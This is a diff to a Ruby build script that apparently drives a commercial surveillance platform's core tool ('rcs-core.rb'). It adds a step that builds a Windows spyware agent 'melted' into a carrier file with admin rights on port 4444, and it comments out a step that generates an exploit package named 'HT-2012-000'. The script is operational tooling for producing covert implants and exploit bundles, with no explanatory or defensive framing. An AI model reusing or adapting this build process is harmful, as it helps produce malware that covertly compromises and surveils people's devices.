@@ -9,6 +9,13 @@ FACTORY = 'RCS_0000000001'
 PLATFORM = 'blackberry'
 
 ###################################################################################################
+params = {platform: 'windows',
+          binary: {demo: true},
+          melt: {admin: true, cooked: true}
+          }
+
+File.open('build.json', 'w') {|f| f.write params.to_json}
+system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -P 4444 -b build.json -o windows_cooked.zip" or raise("Failed")
 =begin
 params = {platform: PLATFORM,
           binary: {demo: true},
@@ -56,6 +63,7 @@ File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -d #{HOST} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
 =end
 ###################################################################################################
+=begin
 params = {platform: 'exploit',
           generate: {exploit: 'HT-2012-000',
                      binary: {demo: true, admin: false},
@@ -67,3 +75,4 @@ params = {platform: 'exploit',
 
 File.open('build.json', 'w') {|f| f.write params.to_json}
 system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o exploit.zip" or raise("Failed")
+=end
